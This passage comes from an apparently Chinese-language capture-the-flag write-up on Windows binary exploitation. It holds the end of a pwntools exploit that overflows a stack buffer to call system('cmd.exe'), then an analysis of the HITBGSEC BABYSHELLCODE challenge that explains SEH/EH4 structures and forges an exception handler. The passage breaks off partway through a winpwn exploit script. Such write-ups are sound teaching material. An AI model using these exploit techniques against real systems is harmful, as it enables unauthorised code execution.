class="line">dll_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x261b1</span></span><br><span class="line">system = dll_base + system_offset</span><br><span class="line">cmd_exe = dll_base + str_cmd_exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">p.sendlineafter(<span class="string">"input your message length"</span>, str(<span class="number">0x100</span>))</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0xCC</span> + p32(<span class="number">0</span>) + p32(system) + p32(<span class="number">0</span>) + p32(cmd_exe)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"press enter to exit"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] dll_base: %s"</span> % hex(dll_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Windows-HITBGSEC-BABYSHELLCODE"><a href="#Windows-HITBGSEC-BABYSHELLCODE" class="headerlink" title="[Windows][HITBGSEC]BABYSHELLCODE"></a>[Windows][HITBGSEC]BABYSHELLCODE</h1><h2 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h2><p>程序开始的时候，先做一个简单的初始化操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">    FILE *v1; <span class="comment">// eax</span></span><br><span class="line">    FILE *v2; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">    v0 = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">    v1 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">    setvbuf(v1, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    v2 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">    setvbuf(v2, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( init_scmgr() &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error to init scmgr!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    *v0 = init_scmgr;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v0[v3] = <span class="number">0x10DCD</span> * v0[v3 - <span class="number">1</span>];</span><br><span class="line">        ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="number">32</span> );</span><br><span class="line">    key = <span class="number">0</span>;</span><br><span class="line">    qmemcpy(buf, v0, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">free</span>(v0);</span><br><span class="line">    enabled = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hey, Welcome to shellcode test system!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里调用了一个自实现的<code>scmgr.dll</code>中的<code>scmgr_init</code>函数，以及利用<code>init_scmgr</code>的地址初始化了一个<code>int[32]</code>的buffer。</p>
<p>其中<code>scmgr_init</code>实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_scmgr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPVOID v0; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_INFO</span> <span class="title">SystemInfo</span>;</span> <span class="comment">// [esp+0h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">    GetSystemInfo(&amp;SystemInfo);</span><br><span class="line">    page_size = SystemInfo.dwPageSize;</span><br><span class="line">    max_size = <span class="number">20</span> * SystemInfo.dwPageSize;</span><br><span class="line">    v0 = VirtualAlloc(<span class="number">0</span>, <span class="number">20</span> * SystemInfo.dwPageSize, <span class="number">0x1000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">    addr = (<span class="keyword">int</span>)v0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Global memory alloc at %p\n"</span>, (<span class="keyword">char</span>)v0);</span><br><span class="line">        result = addr;</span><br><span class="line">        buffer_start = addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Error to alloc globalmemory"</span>);</span><br><span class="line">        result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是分配出了20个page的内存供后续使用。</p>
<p>后面菜单提供<code>add</code>，<code>show</code>，<code>delete</code>，<code>run</code>四个基本功能，顾名思义，就是添加、打印、删除、执行shellcode的操作。<br>比较关键的是<code>run</code>这里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">struct_shellcode</span> *<span class="title">v1</span>;</span> <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    _DWORD *v3; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">char</span> Src[<span class="number">100</span>]; <span class="comment">// [esp+10h] [ebp-80h] BYREF</span></span><br><span class="line">    CPPEH_RECORD ms_exc; <span class="comment">// [esp+78h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(Src, <span class="number">0</span>, <span class="keyword">sizeof</span>(Src));</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"shellcode index:"</span>);</span><br><span class="line">    v0 = read_n();</span><br><span class="line">    v1 = shellcode_array[v0];</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( enabled )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = (_DWORD *)v1-&gt;code;</span><br><span class="line">            <span class="built_in">memcpy</span>(Src, v3, v1-&gt;length);</span><br><span class="line">            *v3 = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="keyword">void</span> (__thiscall *)(<span class="keyword">int</span>))v1-&gt;code)(v1-&gt;code);</span><br><span class="line">        <span class="keyword">if</span> ( enabled )</span><br><span class="line">            <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)shellcode_array[v0]-&gt;code, Src, shellcode_array[v0]-&gt;length);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">        ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">        result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>enabled == 1</code>的情况下（其实总是1），调用<code>memcpy(Src, v3, v1-&gt;length);</code>向栈上的<code>Src</code>复制了一段shellcode，而这个shellcode的长度显然可以超过<code>Src</code>的长度100，所以这里存在一个栈溢出；其次，后面<code>((void (__thiscall *)(int))v1-&gt;code)(v1-&gt;code);</code>执行shellcode前，<code>*v3 = -1;</code>首先将shellcode的前4 bytes置了<code>0xFFFFFFFF</code>，所以肯定会触发错误，从而陷入到错误处理函数中执行，这里就涉及到windows的SEH机制。</p>
<h2 id="SEH-Structured-Exception-Handling"><a href="#SEH-Structured-Exception-Handling" class="headerlink" title="SEH (Structured Exception Handling)"></a>SEH (Structured Exception Handling)</h2><p>SEH(Structured Exception Handling)结构化异常处理是windows的一种异常处理机制，C语言中主要通过<code>try &amp; catch</code>实现。<br>在代码层面，windows相应的函数栈上也会布置一种特殊的结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CPPEH_RECORD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD old_esp;  </span><br><span class="line">    DWORD exc_ptr;  </span><br><span class="line">    _EH3_EXCEPTION_REGISTRATION registration;</span><br><span class="line">&#125;CPPEH_RECORD, *PCPPEH_RECORD;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH3_EXCEPTION_REGISTRATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> _<span class="title">EH3_EXCEPTION_REGISTRATION</span> *<span class="title">Next</span>;</span></span><br><span class="line">　　PVOID ExceptionHandler;</span><br><span class="line">　　PSCOPETABLE_ENTRY scopeTable;</span><br><span class="line">　　DWORD TryLevel;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中:</p>
<ul>
<li><code>prev</code>指向下一个<code>EXCEPTION_FRAME</code>。</li>
<li><code>handler</code>为异常处理函数<code>_except_handler4</code>。</li>
<li><code>scopetable</code>是一个指针，指向<code>PSCOPETABLE_ENTRY</code>，在这里开启GS保护的情况下，它是：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">    DWORD GSCookieOffset;</span><br><span class="line">    DWORD GSCookieXOROffset;</span><br><span class="line">    DWORD EHCookieOffset;</span><br><span class="line">    DWORD EHCookieXOROffset;</span><br><span class="line">    _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE_RECORD</span> &#123;</span></span><br><span class="line">    DWORD EnclosingLevel;</span><br><span class="line">    <span class="keyword">long</span> (*FilterFunc)();</span><br><span class="line">        <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> (*HandlerAddress)();</span><br><span class="line">        <span class="keyword">void</span> (*FinallyFunc)();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li><code>TryLevel</code>可以视为对相应<code>_EH4_SCOPETABLE</code>中<code>_EH4_SCOPETABLE_RECORD</code>的一个索引。</li>
</ul>
<p>从栈的布局上看（借用一张图），为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">                                                ExceptionPointers</span><br><span class="line">                                              +-------------------+</span><br><span class="line">                                  +----------&gt;|  ExceptionRecord  |</span><br><span class="line">                                  |           +-------------------+</span><br><span class="line">                                  |           |   ContextRecord   |</span><br><span class="line">                                  |           +-------------------+</span><br><span class="line">                EH4 Stack         |</span><br><span class="line">          +-------------------+   |                Scope Table</span><br><span class="line">Low       |      ......       |   |           +-------------------+</span><br><span class="line">          +-------------------+   |           |  GSCookieOffset   |</span><br><span class="line">ebp - 18h |        esp        |   |           +-------------------+</span><br><span class="line">          +-------------------+   |           | GSCookieXorOffset |</span><br><span class="line">ebp - 14h | ExceptionPointers |---+           +-------------------+</span><br><span class="line">          +-------------------+               |  EHCookieOffset   |</span><br><span class="line">ebp - 10h |       Next        |               +-------------------+</span><br><span class="line">          +-------------------+               | EHCookieXorOffset |</span><br><span class="line">ebp - 0Ch | ExceptionHandler  |               +-------------------+ </span><br><span class="line">          +-------------------+   +----------&gt;|  EncloseingLevel  |---&gt; 0xFFFFFFFE </span><br><span class="line">ebp - 08h |    Scope Table    |   | Level 0   +-------------------+  </span><br><span class="line">          +-------------------+   |           |     FilterFunc    |  </span><br><span class="line">ebp - 04h |     TryLevel      |---+           +-------------------+ </span><br><span class="line">          +-------------------+   |           |    HandlerFunc    | </span><br><span class="line">ebp       |        ebp        |   |           +-------------------+  </span><br><span class="line">          +-------------------+   +----------&gt;|  EncloseingLevel  |---&gt; 0x00000000</span><br><span class="line">High      |      ......       |     Level 1   |-------------------+</span><br><span class="line">          +-------------------+               |     FilterFunc    |</span><br><span class="line">                                              +-------------------+</span><br><span class="line">                                              |    HandlerFunc    |</span><br><span class="line">                                              +-------------------+</span><br></pre></td></tr></table></figure>

<p>检查<code>_EH3_EXCEPTION_REGISTRATION-&gt;prev</code>合法之后，会通过调用<code>_EH3_EXCEPTION_REGISTRATION-&gt;ExceptionHandler</code>，也就是<code>_except_handler4</code>函数进入异常处理流程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">ValidateLocalCookies</span><span class="params">(<span class="keyword">void</span> (__fastcall *cookieCheckFunction)(<span class="keyword">unsigned</span> <span class="keyword">int</span>), _EH4_SCOPETABLE *scopeTable, <span class="keyword">char</span> *framePointer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// esi@2</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// esi@3</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( scopeTable-&gt;GSCookieOffset != <span class="number">-2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];</span><br><span class="line">        __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">        ((<span class="keyword">void</span> (__thiscall *)(_DWORD))cookieCheckFunction)(v3);</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];</span><br><span class="line">    __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">    ((<span class="keyword">void</span> (__thiscall *)(_DWORD))cookieCheckFunction)(v4);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> __cdecl _except_handler4_common(<span class="keyword">unsigned</span> <span class="keyword">int</span> *securityCookies, <span class="keyword">void</span> (__fastcall *cookieCheckFunction)(<span class="keyword">unsigned</span> <span class="keyword">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="keyword">unsigned</span> __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// xor scope table</span></span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="number">8</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// sehFrame is the address of _EH3_EXCEPTION_REGISTRATION at stack</span></span><br><span class="line">    framePointer = (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Validate GS</span></span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + <span class="number">12</span>);</span><br><span class="line">        *(_DWORD *)(sehFrame - <span class="number">4</span>) = &amp;exceptionPointers;</span><br><span class="line">        <span class="keyword">if</span> ( tryLevel != <span class="number">-2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + <span class="number">2</span> * (tryLevel + <span class="number">2</span>);</span><br><span class="line">                filterFunc = (<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="keyword">char</span> *)scopeTable_1 + <span class="number">4</span> * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                <span class="keyword">if</span> ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// call FilterFunc</span></span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    <span class="keyword">if</span> ( filterFuncRet &gt; <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        <span class="comment">// call HandlerFunc</span></span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="number">16</span>);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                <span class="keyword">if</span> ( encloseingLevel == <span class="number">-2</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单描述一下这个流程：</p>
<ol>
<li>首先通过xor解密<code>_EH3_EXCEPTION_REGISTRATION-&gt;scopetable</code>，得到相应的地址。</li>
<li>获取栈上存放的old ebp的位置（也就是当前栈的ebp，即framePointer)，进行如下check：<ul>
<li>如果<code>scopeTable-&gt;GSCookieOffset != -2</code>，则保证<code>ebp ^ cookie == __security_cookie</code>，这里ebp就是当前函数栈的ebp，cookie也是当前栈的cookie，与函数返回前对GS进行check的逻辑一致。</li>
<li><code>ebp ^ *(ebp - scopetable-&gt;EHCookieOffset) == __security_cookie</code>。</li>
</ul>
</li>
<li>获取栈上存放的<code>_EH3_EXCEPTION_REGISTRATION-&gt;tryLevel</code>，检查该<code>TryLevel != -2</code>的情况下找到对应的<code>_EH4_SCOPETABLE-&gt;_EH4_SCOPETABLE_RECORD</code>。</li>
<li>如果<code>_EH4_SCOPETABLE_RECORD-&gt;FilterFunc</code>不为空，则执行<code>FilterFunc</code>，返回值大于0则继续执行<code>HandlerFunc</code>。</li>
</ol>
<h2 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>首先利用程序最开始输入name再打印name，leak出栈上存放的ebp，cookie和return address，这样可以计算出<code>__security_cookie</code>、栈地址和程序基地址。</li>
<li>由于在<code>init</code>中，程序获取了<code>scmgr_init</code>的地址，并利用它生成了一个<code>int[32]</code>的buffer，如果调用5号功能，可以得到加密后的buffer内容，因此只要获得明文的buffer内容，我们就可以拿到<code>scmgr_init</code>的地址，进而获得<code>scmgr.dll</code>的基地址，获得其中存在的后门<code>test_getshell</code>的地址。</li>
<li>考虑该加密应该是单向散列，所以逆推不太可能；此外，<code>scmgr_init</code>的地址为<code>scmgr.dll + 0x1100</code>，<code>scmgr.dll</code>的基址低2 bytes为0，所以只需要爆破高2 bytes即可，速度很快。</li>
<li>拿到<code>scmgr.dll</code>的基址，就可以利用<code>run</code>功能中的栈溢出，布置栈上的内容；只要伪造<code>_EH3_EXCEPTION_REGISTRATION-&gt;ExceptionHandler</code>为后门地址，加上<code>_EH3_EXCEPTION_REGISTRATION-&gt;prev</code>指向原来的地方，即可再触发异常的时候执行该后门getshell。</li>
</ol>
<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'error'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babyshellcode.exe"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 29190)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"leave your name"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Option:"</span>, str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, shellcode)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode size:"</span>, 